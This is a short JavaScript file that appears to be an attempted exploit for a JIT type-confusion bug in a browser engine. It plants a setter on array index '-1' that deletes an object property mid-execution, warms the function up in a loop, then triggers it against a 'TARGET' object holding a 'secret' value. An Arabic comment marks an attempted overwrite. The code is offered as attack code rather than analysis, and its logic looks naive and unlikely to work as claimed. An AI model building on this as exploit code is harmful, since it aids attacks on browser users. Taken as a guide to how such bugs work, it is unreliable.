const NUM_ITERATIONS = 10;
const ARRAY_LENGTH = 1000;

let arr1 = [];
let arr2 = [1.1, 2.2, , 4.4];
let TARGET = { secret: 0x12345678 };

arr2.__defineSetter__("-1", function(x) {
    alert('Setter called on -1, deleting arr1.x');
    delete arr1.x;
});

function f(b, index, target) {
    let ai = { x4: 42 };
    let aT = { x4: 1337 };
    arr1.x = ai;
    if (b) arr1.x = aT;
    arr2[index] = 1.1;
    try {
        let result = arr1.x.x4;
        alert('Result of arr1.x.x4 = ' + result);
    } catch (e) {
        alert('Crash or Type Confusion: ' + e);
    }
    if (index === -1 && target) {
        arr1.x = target; // محاولة كتابة قيمة جديدة
    }
    return arr1.x ? arr1.x.x4 : null;
}

function main() {
    for (let i = 0; i < NUM_ITERATIONS; i++) {
        arr2.length = 4;
        f((i & 1) === 1, 5, null);
    }
    f(true, -1, TARGET); // Trigger with TARGET
    alert('Final arr1.x.x4 = ' + (arr1.x ? arr1.x.x4 : 'undefined'));
    alert('TARGET.secret = ' + TARGET.secret);
}

main();